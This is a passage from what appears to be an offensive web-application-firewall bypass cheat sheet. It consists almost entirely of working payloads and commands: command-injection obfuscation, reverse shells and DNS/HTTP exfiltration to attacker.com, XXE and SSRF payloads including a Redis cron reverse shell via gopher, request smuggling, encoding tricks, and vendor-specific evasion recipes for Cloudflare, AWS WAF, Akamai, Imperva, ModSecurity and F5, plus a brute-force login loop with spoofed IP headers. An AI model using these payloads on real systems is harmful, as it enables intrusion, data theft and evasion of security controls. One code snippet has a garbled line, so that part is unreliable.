{bash,-c,{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|bash}
```

### 5.3 Base64 Encoded Commands

```bash
# Encode payload
echo -n 'id' | base64  # aWQ=
echo -n 'cat /etc/passwd' | base64  # Y2F0IC9ldGMvcGFzc3dk

# Execute via echo pipe
echo${IFS}aWQ=|base64${IFS}-d|bash
$(echo${IFS}aWQ=|base64${IFS}-d)

# Without spaces
{echo,Y2F0IC9ldGMvcGFzc3dk}|{base64,-d}|bash
```

### 5.4 Hex Encoded Commands

```bash
# Encode 'id' as hex
printf '%s' 'id' | xxd -p  # 6964

# Execute
$(echo${IFS}6964|xxd${IFS}-r${IFS}-p)
$(printf${IFS}"\x69\x64")
`echo 6964|xxd -r -p`
```

### 5.5 Variable Substitution Tricks

```bash
# Split keywords using variables
c=ca;t=t;$c$t /etc/passwd
cmd=cat;$cmd /etc/passwd

# Using parameter expansion
a=c;b=at;$a$b /etc/passwd
x=c${a}t;$x /etc/passwd

# Indirect expansion
_cat=cat;${_cat} /etc/passwd
```

### 5.6 Glob Pattern Command Bypass

```bash
# When 'cat' is filtered but path wildcards work
/???/??t /etc/passwd       # /bin/cat or /usr/cat
/usr/b??/curl http://...   # /usr/bin/curl
/???/b?s? -c 'id'          # /bin/bash -c 'id'

# Directory traversal for binary path
/bin/./cat /etc/passwd
/bin/../bin/cat /etc/passwd
```

### 5.7 Reverse Shell Without Spaces

```bash
# bash reverse shell without spaces
{bash,-i,>&,/dev/tcp/attacker.com/4444,0>&1}

# Python no-space
python3${IFS}-c${IFS}'import${IFS}socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));[os.dup2(s.fileno(),x)for${IFS}x${IFS}in[0,1,2]];subprocess.call(["/bin/sh","-i"])'

# nc alternative
{nc,-e,/bin/sh,attacker.com,4444}
{nc.traditional,-e,/bin/sh,attacker.com,4444}

# Using base64 encoded reverse shell
echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx|base64${IFS}-d|bash
```

### 5.8 DNS Exfil for Blind CMDi

```bash
# Exfiltrate via DNS lookup
nslookup$(whoami).attacker.com
host$(cat /etc/passwd|md5sum|cut -c1-8).attacker.com
dig$(id|base64).attacker.com

# With IFS bypass
nslookup${IFS}$(whoami).attacker.com
curl${IFS}http://$(whoami).attacker.com/

# Burp Collaborator interaction
curl${IFS}https://BURPCOLLAB.burpcollaborator.net/$(id|base64)
```

---

## 6. PATH TRAVERSAL WAF BYPASS

### 6.1 Encoding Variations

```
# Single encoding
../../../etc/passwd → %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoding
../ → %252e%252e%252f
../../../etc/passwd → %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Triple encoding  
../ → %25252e%25252e%25252f
```

### 6.2 Unicode and Overlong UTF-8

```
# Unicode slash alternatives
..%c0%af = ../ (overlong encoding of /)
..%ef%bc%8f = ../  (fullwidth solidus)
..%e0%80%af = ../  (overlong 3-byte encoding)

# Dot alternatives
%c0%2e = . (overlong)
%e0%40%ae = . (overlong 3-byte)
%c0%ae = . (overlong 2-byte)

# Combined
%c0%ae%c0%ae%c0%af = ../
%c0%ae%c0%ae%ef%bc%8f = ../
```

### 6.3 Path Normalization Tricks

```
# Extra dots/slashes that normalize to ..
....//
....\/
..../
.../
..%2f
..\/ (Windows)

# Mixed separators
..\/../etc/passwd
../\../etc/passwd
..%5c..%5cetc%5cpasswd  (Windows with %5c = \)

# Extra slashes
..//../../etc/passwd
.///.//..//..//etc/passwd
```

### 6.4 Null Byte Injection

```
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png
../../../etc/passwd%2500.jpg   # double-encoded null

# In filename parameter
filename=../../etc/passwd%00.pdf
```

### 6.5 Windows-Specific Bypass

```
# UNC path
\\attacker.com\share\file

# Drive letter
c:/windows/system32/drivers/etc/hosts
C:\Windows\System32\drivers\etc\hosts
%WINDIR%\system32\drivers\etc\hosts

# Alternate data streams
../../Windows/system32/cmd.exe::$DATA

# 8.3 filename format
../../WINDOWS/SYSTEM32/DRIVER~1/ETC/PASSWD
```

### 6.6 Java Path Bypass

```
/./WEB-INF/../WEB-INF/web.xml
/WEB-INF/./web.xml
/%57EB-INF/web.xml   (%57 = W)
/WEB-INF%2fweb.xml
```

### 6.7 PHP Include Bypass

```php
// php://filter to bypass include path restrictions
php://filter/convert.base64-encode/resource=../../etc/passwd
php://filter/read=convert.base64-encode/resource=index.php
php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
php://input  (with POST body containing PHP code)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

---

## 7. XXE WAF BYPASS

### 7.1 UTF-16 Encoding

```bash
# Generate UTF-16LE encoded XXE payload
python3 -c "
payload = '''<?xml version='1.0' encoding='UTF-16'?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<foo>&xxe;</foo>'''
print(payload.encode('utf-16').hex())
" | xxd -r -p > xxe_utf16le.xml

# UTF-16 with BOM
python3 -c "
import codecs
payload = '<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>'
with open('xxe_utf16.xml', 'wb') as f:
    f.write(codecs.BOM_UTF16_LE + payload.encode('utf-16-le'))
"

curl -X POST "https://TARGET/parse" \
  -H "Content-Type: application/xml; charset=UTF-16" \
  --data-binary @xxe_utf16.xml
```

### 7.2 Parameter Entity XXE

```xml
<!-- Bypass entity restrictions using parameter entities -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
  %int;
]>
<foo>&exfil;</foo>

<!-- evil.dtd at attacker.com -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
```

### 7.3 Blind OOB XXE via DNS/HTTP

```xml
<!-- DNS-based OOB -->
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % sp SYSTEM "http://BURPCOLLAB.burpcollaborator.net/">
  %sp;
]>
<data>test</data>

<!-- HTTP exfil -->
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&exfil;</data>
```

### 7.4 XInclude XXE

```xml
<!-- No DOCTYPE needed, works in fragment processing -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

<!-- In a data field -->
<name><xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/></name>
```

### 7.5 SVG XXE

```xml
<!-- Upload as .svg file -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### 7.6 XLSX/DOCX XXE

```bash
# Create malicious XLSX
mkdir -p malicious_xlsx/xl
cp template.xlsx malicious_xlsx/

# Edit xl/sharedStrings.xml or [Content_Types].xml
cat > malicious_xlsx/xl/sharedStrings.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <si><t>&xxe;</t></si>
</sst>
EOF

cd malicious_xlsx && zip -r ../evil.xlsx . && cd ..
```

### 7.7 PHP Filter XXE

```xml
<!-- Read PHP source via filter -->
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&file;</data>
```

---

## 8. SSRF WAF BYPASS

### 8.1 IP Representation Bypass

```
# Decimal
http://2130706433/         # 127.0.0.1 in decimal
http://3232235777/         # 192.168.1.1 in decimal

# Hex
http://0x7f000001/         # 127.0.0.1
http://0xC0A80101/         # 192.168.1.1

# Octal
http://0177.0.0.1/         # 127.0.0.1
http://0177.000.000.001/

# IPv6 mapped
http://[::1]/              # localhost
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://[0000:0000:0000:0000:0000:ffff:7f00:0001]/

# Shortened
http://127.1/              # 127.0.0.1 on some systems
http://127.0.1/
http://0/                  # 0.0.0.0
```

### 8.2 Cloud Metadata Bypass

```bash
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
# Bypass with IP variants
http://169.254.169.254.xip.io/
http://169.254.169.254.nip.io/

# AWS IMDSv2 — steal token via SSRF then use
# Step 1: Get token
curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# Step 2: Use token  
curl -H "X-aws-ec2-metadata-token: TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
# Must include header: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2020-09-01
# Must include: Metadata: true

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
```

### 8.3 Protocol Handler SSRF

```bash
# File read
file:///etc/passwd
file://localhost/etc/passwd
file:///proc/self/environ

# Gopher (Redis exploitation)
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# Dict protocol
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats   # Memcached

# LDAP
ldap://127.0.0.1:389/
ldaps://127.0.0.1:636/

# FTP
ftp://user:pass@127.0.0.1/etc/passwd
```

### 8.4 URL Parser Confusion

```
# @ trick (credentials confuse parser)
https://attacker.com@169.254.169.254/
http://attacker.com@127.0.0.1/
https://169.254.169.254.attacker.com@169.254.169.254/

# # fragment confusion
https://169.254.169.254#.attacker.com/
http://attacker.com/redirect?url=http://169.254.169.254#

# Backslash confusion (Windows-style)
http:\\169.254.169.254\latest\meta-data

# Mixed slashes
http:/\169.254.169.254/latest/

# Port in path
http://169.254.169.254:80@attacker.com/
```

### 8.5 SSRF to RCE via Redis

```bash
# SSRF payload to write cron job via Redis
# URL-encoded gopher payload
TARGET_SSRF_PARAM="url"
ATTACKER_IP="10.0.0.1"
ATTACKER_PORT="4444"

# Generate Redis command set
python3 -c "
import urllib.parse

redis_cmds = [
    '*1\r\n\$8\r\nflushall\r\n',
    '*3\r\n\$3\r\nset\r\n\$1\r\n1\r\n\$65\r\n\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1\n\n\r\n',
    '*4\r\n\$6\r\nconfig\r\n\$3\r\nset\r\n\$3\r\ndir\r\n\$16\r\n/var/spool/cron/\r\n',
    '*4\r\n\$6\r\nconfig\r\n\$3\r\nset\r\n\$10\r\ndbfilename\r\n\$4\r\nroot\r\n',
    '*1\r\n\$4\r\nsave\r\n',
]
payload = ''.join(redis_cmds)
gopher = 'gopher://127.0.0.1:6379/_' + urllib.parse.quote(payload)
print(gopher)
"
```

---

## 9. HTTP-LEVEL WAF BYPASS

### 9.1 Chunked Transfer Encoding

```http
POST /search HTTP/1.1
Host: TARGET.COM
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

7
q=UNIO
1
N
7
+SELEC
1
T
5
+1,2,3
0

```

```bash
# Using Python for chunked request
python3 -c "
import socket
s = socket.socket()
s.connect(('TARGET.COM', 80))
request = (
    'POST /search HTTP/1.1\r\n'
    'Host: TARGET.COM\r\n'
    'Transfer-Encoding: chunked\r\n'
    'Content-Type: application/x-www-form-urlencoded\r\n'
    '\r\n'
    '5\r\nq=UNI\r\n'
    '3\rON \r\n'
    '7\r\nSELECT\r\n'
    '0\r\n\r\n'
)
s.send(request.encode())
print(s.recv(4096).decode())
"
```

### 9.2 HTTP Request Smuggling for WAF Bypass (CL.TE)

```http
# CL.TE: Front-end uses Content-Length, backend uses Transfer-Encoding
# WAF sees one request, backend processes two

POST / HTTP/1.1
Host: TARGET.COM
Content-Length: 49
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: TARGET.COM
X-Ignore: X
```

```http
# TE.CL: Front-end uses Transfer-Encoding, backend uses Content-Length
POST / HTTP/1.1
Host: TARGET.COM
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /admin HTTP/1.1
Host: TARGET.COM
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=1
0

```

### 9.3 HTTP Parameter Pollution (HPP)

```http
# WAF checks first param, app uses last (or vice versa)
GET /search?q=safe&q=<script>alert(1)</script> HTTP/1.1

# POST HPP
POST /search HTTP/1.1
Content-Type: application/x-www-form-urlencoded

q=safe&q=1'+UNION+SELECT+1,2,3--

# WAF sees q=safe, app processes q=<payload>
```

### 9.4 Content-Type Manipulation

```bash
# JSON payload in XML content-type
curl -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/xml" \
  -d '{"key":"<script>alert(1)</script>"}'

# XML payload in JSON content-type
curl -X POST "https://TARGET/api/xml-parser" \
  -H "Content-Type: application/json" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

# Multipart to bypass content inspection
curl -X POST "https://TARGET/upload" \
  -F "file=@/dev/null;filename=shell.php" \
  -F "cmd=<script>alert(1)</script>"

# text/plain to bypass JSON/XML WAF rules
curl -X POST "https://TARGET/api" \
  -H "Content-Type: text/plain" \
  -d '{"q":"1 UNION SELECT 1,2,3--"}'
```

### 9.5 IP Spoofing Header Bypass

```bash
# WAF trusts these headers for IP-based rules
# If WAF allows internal IPs, add internal IP in these headers

BYPASS_HEADERS=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Forwarded-For: 127.0.0.1, 127.0.0.2"
  "X-Real-IP: 127.0.0.1"
  "X-Originating-IP: 127.0.0.1"
  "X-Remote-IP: 127.0.0.1"
  "X-Remote-Addr: 127.0.0.1"
  "X-Client-IP: 127.0.0.1"
  "True-Client-IP: 127.0.0.1"
  "CF-Connecting-IP: 127.0.0.1"
  "X-Cluster-Client-IP: 127.0.0.1"
  "Forwarded: for=127.0.0.1"
  "X-ProxyUser-Ip: 127.0.0.1"
)

for header in "${BYPASS_HEADERS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/?id=1'OR'1'='1" -H "$header")
  echo "[$CODE] $header"
done
```

### 9.6 Method Override

```bash
# Override POST to bypass method-specific WAF rules
curl -X GET "https://TARGET/admin/delete?id=1" \
  -H "X-HTTP-Method-Override: DELETE"

curl -X POST "https://TARGET/api" \
  -H "X-Method-Override: PUT" \
  -H "X-HTTP-Method: PATCH" \
  -d '{"admin":true}'
```

### 9.7 HTTP/2 Header Injection

```http
# HTTP/2 pseudo-header abuse
:method: GET
:path: /
:scheme: https
:authority: TARGET.COM
x-injected: value\r\nHost: attacker.com

# H2C smuggling — HTTP/2 cleartext upgrade
# Send HTTP/1.1 request with h2c upgrade, smuggle HTTP/2 frames
```

### 9.8 Large Body Bypass (Payload Padding)

```bash
# WAF may stop inspecting after N bytes — put payload after padding
python3 -c "
padding = 'A' * 65536  # 64KB of junk
payload = padding + \"' UNION SELECT 1,2,3--\"
print(f'id={payload}')
" | curl -sk "https://TARGET/page" --data-binary @-
```

### 9.9 Accept-Encoding Manipulation

```bash
# Some WAFs decompress and inspect — some don't
curl "https://TARGET/?id=1" \
  -H "Accept-Encoding: gzip, deflate, br" \
  --compressed

# Send pre-compressed payload
python3 -c "
import gzip, sys
payload = b\"id=1' UNION SELECT 1,2,3--\"
sys.stdout.buffer.write(gzip.compress(payload))
" | curl "https://TARGET/page" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Content-Encoding: gzip" \
  --data-binary @-
```

---

## 10. ENCODING AND UNICODE BYPASS

### 10.1 URL Encoding Chains

```
Original: ' UNION SELECT 1,2,3--
Single: %27%20UNION%20SELECT%201%2C2%2C3--
Double: %2527%2520UNION%2520SELECT%25201%252C2%252C3--
Triple: %252527%252520UNION%252520SELECT%2525201%25252C2%25252C3--
Mixed:  %27%2520UNION%2520SELECT%25201,2,3--
```

### 10.2 Unicode Normalization Bypass

```python
# NFC/NFD normalization — server normalizes, WAF sees different bytes
# ＜ (U+FF1C fullwidth less-than) normalizes to < in some contexts
# ｓ (U+FF53 fullwidth s) normalizes to s

# Python to generate fullwidth equivalents
def to_fullwidth(s):
    result = ""
    for c in s:
        if 'a' <= c <= 'z' or 'A' <= c <= 'Z' or '0' <= c <= '9':
            result += chr(ord(c) + 0xFEE0)
        elif c == ' ':
            result += '\u3000'          else:
            result += c
    return result

# alert(1) in fullwidth
print(to_fullwidth("alert(1)"))
# Output: ａｌｅｒｔ（１）
```

### 10.3 Fullwidth Character Bypass

```
# Fullwidth equivalents bypass keyword-matching WAFs
ａｌｅｒｔ(1)               # alert
ｓｅｌｅｃｔ                  # select
ｕｎｉｏｎ ｓｅｌｅｃｔ          # union select
＜ｓｃｒｉｐｔ＞               # <script>
```

### 10.4 HTML Entity Encoding in Context

```html
<!-- In HTML attribute context (unquoted) -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>

<!-- Mixed entities -->
<img src=x onerror=&Tab;alert(1)>
<img src=x onerror=&NewLine;alert(1)>

<!-- Named entities that browsers decode -->
<img src=x onerror=&lpar;alert&lpar;1&rpar;&rpar;>
```

### 10.5 JavaScript Unicode and Hex Escapes

```javascript
// Unicode escape in JS identifiers
\u0061\u006c\u0065\u0072\u0074(1)        // alert(1)
\u{61}\u{6c}\u{65}\u{72}\u{74}(1)        // ES6+ unicode point escapes

// Hex escape in strings
eval("\x61\x6c\x65\x72\x74\x28\x31\x29") // eval("alert(1)")

// Octal escape (non-strict mode)
eval("\141\154\145\162\164\50\61\51")

// Template literal with tag
String.raw`\u0041` // 'A' unprocessed
```

### 10.6 CSS Unicode Escapes

```css
/* CSS unicode escape for property injection */
body{background:\75rl(javascript:alert(1))}
/* = background:url(javascript:alert(1)) */

/* In CSS expression (IE) */
expression(\u0061\u006c\u0065\u0072\u0074(1))

/* Backslash before characters */
\<\s\c\r\i\p\t\>alert(1)\<\/\s\c\r\i\p\t\>
```

### 10.7 Overlong UTF-8 Sequences

```
# These are invalid UTF-8 but some parsers accept them
# / = 0x2F
# Overlong 2-byte: 0xC0 0xAF
# Overlong 3-byte: 0xE0 0x80 0xAF

# In URLs (some older/misconfigured servers decode)
..%c0%af       = ../
..%e0%80%af    = ../
%c0%ae%c0%ae%c0%af = ../

# . = 0x2E
# Overlong: %c0%2e, %e0%40%ae
%c0%2e%c0%2e%c0%af = ../
```

### 10.8 Mixed Encoding Chains

```
# Layer 1: HTML encode, Layer 2: URL encode, Layer 3: JS encode
# Each layer decoded by a different processing stage

# XSS through 3 layers:
# Raw:      <script>alert(1)</script>
# HTML:     &lt;script&gt;alert(1)&lt;/script&gt;
# URL:      %26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B
# Double:   %2526lt%253Bscript%2526gt%253Balert(1)%2526lt%253B%252Fscript%2526gt%253B

# SQLi through encoding chain:
# Raw:      ' UNION SELECT 1--
# URL enc:  %27%20UNION%20SELECT%201--
# Double:   %2527%2520UNION%2520SELECT%25201--
# + encoded spaces: %27+UNION+SELECT+1--
```

### 10.9 Null Byte and Newline Injection

```
# Null byte terminates strings in C-based parsers
payload%00innocuous
SELECT%001,2,3--
<script%00>alert(1)</script%00>

# Newline injection in headers
Host: TARGET.COM%0d%0aX-Injected: true
User-Agent: normal%0aX-Forwarded-For: 127.0.0.1

# CRLF injection
Location: /redirect%0d%0aSet-Cookie: session=pwned
```

### 10.10 IDN Homograph Attacks

```
# Unicode characters that look like ASCII
# а (Cyrillic а, U+0430) looks like a (Latin a)
# е (Cyrillic е, U+0435) looks like e
# о (Cyrillic о, U+043E) looks like o

# Example domain lookalike
аdmin.example.com  # Cyrillic а + dmin

# In URLs, browsers show punycode:
# аdmin.example.com = xn--dmin-qua.example.com

# Bypass blocklist that checks for "admin" as ASCII
```

---

## 11. PER-VENDOR BYPASS PLAYBOOKS

### 11.1 Cloudflare Bypass

**Known-Working Bypass Patterns (2024)**
```http
# XSS — Cloudflare does not block all SVG variants
<svg/onload=alert`1`>
<details/open/ontoggle=alert(1)>
<img src=x onerror=window['alert'](1)>
<input onfocus=alert(1) autofocus>

# SQLi bypass against Cloudflare
1'/*!50000UNION*//*!50000SELECT*/1,2,3--+-
1'/**/UNION/**/SELECT/**/1,user(),3--+-
1'%23%0aUNION%23%0aSELECT%23%0a1,2,3--+-
1' UNION%0aSELECT%0a1,2,3--+-

# Chunked encoding bypass
POST /search HTTP/1.1
Host: TARGET.COM
Transfer-Encoding: chunked

a
q=UNION SE
9
LECT 1,2
0

```

**workers.dev Origin Bypass**
```bash
# Cloudflare Workers may expose origin
# workers.dev domains bypass CF WAF
curl -sk "https://TARGET.workers.dev/?id=1'OR'1'='1"

# Check for worker subdomain
dig TARGET.workers.dev
```

**Rate Limit Bypass via IP Rotation Headers**
```bash
# Cloudflare rate limits by IP — spoof via headers
for i in $(seq 1 100); do
  IP="10.$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"
  curl -sk "https://TARGET/api/login" \
    -H "CF-Connecting-IP: $IP" \
    -H "X-Forwarded-For: $IP" \
    -d "user=admin&pass=password$i"
done
```

**cf_clearance Cookie Bypass Concept**
```python
# Use Playwright/Puppeteer to solve JS challenge, extract cf_clearance
# Then replay with curl
import subprocess
result = subprocess.run([
    'node', 'solve_cf.js', 'https://TARGET.COM'
], capture_output=True)
cf_clearance = result.stdout.decode().strip()
# Use extracted cookie
subprocess.run([
    'curl', '-sk', f'https://TARGET.COM/?id=1%27',
    '-H', f'Cookie: cf_clearance={cf_clearance}'
])
```

### 11.2 AWS WAF Bypass

**RegEx Complexity Attack**
```
# AWS WAF regex engine has complexity limits
# Craft payloads that exceed regex backtracking

# Long repeated patterns confuse RegEx WAF rules
' OR 1=1-- -AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

# Mixed case + junk to confuse ML scoring
1' uNiOn SeLeCt 1,2,@@VERSION,4-- -
```

**JSON Body Bypass**
```bash
# AWS WAF SQL rules target form params, not always JSON
curl -X POST "https://TARGET/api/user" \
  -H "Content-Type: application/json" \
  -d '{"id":"1 UNION SELECT 1,2,3--"}'

# Nested JSON
curl -X POST "https://TARGET/api/user" \
  -H "Content-Type: application/json" \
  -d '{"query":{"id":"1'"'"' OR '"'"'1'"'"'='"'"'1"}}'

# JSON with Unicode escapes
curl -X POST "https://TARGET/api" \
  -H "Content-Type: application/json" \
  -d '{"q":"\u003cscript\u003ealert(1)\u003c\/script\u003e"}'
```

**Managed Rule Group Bypass**
```bash
# AWS WAF AWSManagedRulesSQLiRuleSet bypass
# The SQLi rules score based on patterns — get below threshold
# Split across multiple parameters
curl "https://TARGET/page?id=1%27&extra=UNION&more=SELECT&data=1,2,3--"

# Use HAVING instead of WHERE
curl "https://TARGET/?id=1 HAVING 1=1--"

# Comment-based bypass specific to AWS rule format
curl "https://TARGET/?id=1'%23%0AUNION%23%0ASELECT%23%0A1,2,3--"
```

### 11.3 Akamai Bypass

**Pragma Header Trick**
```bash
# Akamai sometimes skips inspection on requests with Pragma: no-cache
curl "https://TARGET/?id=1'OR'1'='1" \
  -H "Pragma: no-cache" \
  -H "Cache-Control: no-cache"

# Combined with no-store
curl "https://TARGET/?id=1'OR'1'='1" \
  -H "Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-nonces, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no"
```

**Akamai-Specific Encoding Bypass**
```bash
# Akamai decodes URL encoding twice in some configs
# Double-encode the attack chars
curl "https://TARGET/?id=1%2527%2520UNION%2520SELECT%25201,2,3--"

# Mixed encoding confuses Akamai pattern matching
curl "https://TARGET/?id=1%27%20UNION%2520SELECT%201,2,3--"

# Unicode path bypass
curl "https://TARGET/%u002e%u002e/%u002e%u002e/etc/passwd"
```

### 11.4 Imperva/Incapsula Bypass

**Cookie-Based Bypass**
```bash
# Imperva tracks sessions — establish benign session first
# Then replay with attack payload using same cookies

# Step 1: Get clean session cookies
COOKIES=$(curl -ski "https://TARGET/" | grep -i "set-cookie" | \
  grep -E "(visid_incap|nlbi|incap_ses)" | \
  awk -F': ' '{print $2}' | awk -F';' '{print $1}' | tr '\n' '; ')

# Step 2: Send attack with established session
curl -sk "https://TARGET/?id=1'OR'1'='1" \
  -H "Cookie: $COOKIES"
```

**User-Agent Manipulation**
```bash
# Imperva whitelists known good bots
curl "https://TARGET/?id=1'OR'1'='1" \
  -H "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)"

curl "https://TARGET/?id=1'OR'1'='1" \
  -H "User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
```

### 11.5 ModSecurity CRS Bypass

**Paranoia Level Bypass Matrix**
```
PL1 (default): Basic rules, easiest to bypass
PL2: Additional rules, moderate difficulty  
PL3: Advanced rules, strict
PL4: Maximum rules, very strict (rarely used in production)

Most production deployments: PL1 or PL2
Target anomaly score threshold: usually 5 (PL1), 5-10 (PL2)
```

**SQLi Rule Bypass (942xxx rules)**
```sql
-- Rule 942100: SQL Injection Attack Detected via libinjection
-- Bypass: use operators libinjection doesn't fingerprint
1;SELECT%20IF(1=1,SLEEP(3),0)--
1'XOR(if(now()=sysdate(),sleep(3*0),0))XOR'
-- Rule 942110: SQL Injection Attack: Common Injection Testing Detected
-- Bypass: avoid ' OR 1=1
1' AND 1=1 LIMIT 1--
-- Rule 942160: Detects blind sqli tests using sleep() or benchmark()
-- Bypass: use alternative delay functions
1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--
-- Rule 942200: MySQL comment-/space-obfuscated injections
-- Bypass: use different obfuscation
1'/*!50000UNION*/+/*!50000SELECT*/+1,2,3--+-
```

**XSS Rule Bypass (941xxx rules)**
```html
<!-- Rule 941100: XSS Attack Detected via libinjection -->
<svg onload=alert(1)>
<!-- Rule 941110: XSS Filter - Category 1 -->
<img src=x onerror=this.onerror=console.log;fetch`//attacker.com/?`+document.cookie>
<!-- Rule 941130: XSS Filter - Category 3 -->
<details open ontoggle=alert`1`>
<!-- Rule 941160: NoScript XSS InjectionChecker -->
<math href="javascript:alert(1)">click</math>
```

**Anomaly Score Exploitation**
```bash
# Spread attack across multiple requests — each below threshold
# Total anomaly score = sum of matched rules
# Threshold = 5 for PL1

# Instead of one request scoring 10+, send 3 requests scoring 4 each

# Request 1 (score ~3)
curl "https://TARGET/?a=1+UNION+SELECT"

# Request 2 (score ~3)  
curl "https://TARGET/?b=1,2,3"

# Request 3 (score ~3)
curl "https://TARGET/?c=FROM+users--"
# None individually trigger block, but if processed together = full exploit
```

### 11.6 F5 BIG-IP ASM Bypass

**Policy Learning Exploitation**
```bash
# BIG-IP learns traffic patterns — send benign traffic first to teach it
# Then gradually add attack components

# Phase 1: Benign training (20+ requests)
for i in $(seq 1 20); do
  curl -sk "https://TARGET/search?q=normal+query+$i"
  sleep 1
done

# Phase 2: Introduce mild variations
for i in $(seq 1 10); do
  curl -sk "https://TARGET/search?q=query+OR+$i"
  sleep 2
done

# Phase 3: Full payload after policy training
curl -sk "https://TARGET/search?q=1'+OR+'1'='1"
```

**JSON/XML Parser Bypass**
```bash
# F5 ASM parses JSON differently from app
# Inject via nested/malformed JSON
curl -X POST "https://TARGET/api" \
  -H "Content-Type: application/json" \
  -d '{"data":{"query":"1 UNION SELECT 1,2,3--","type":"search"}}'

# XML with namespace confusion
curl -X POST "https://TARGET/api" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><root xmlns:t="http://attacker.com"><t:query>1 UNION SELECT 1,2,3--</t:query></root>'
```

---

## 12. TOOL-SPECIFIC WAF BYPASS

### 12.1 sqlmap Tamper Script Reference

**Complete Tamper Script Catalog with Use Cases**
```
apostrophemask.py      → Replace ' with %EF%BC%87 (fullwidth apostrophe)
apostrophenullencode.py → Replace ' with %00%27
appendnullbyte.py      → Append NULL byte to payload end
base64encode.py        → Base64 encode entire payload
between.py             → Replace > with NOT BETWEEN 0 AND, = with BETWEEN
bluecoat.py            → Replace spaces with %09, bypass Blue Coat proxy WAF
charencode.py          → URL-encode all chars (not just special ones)
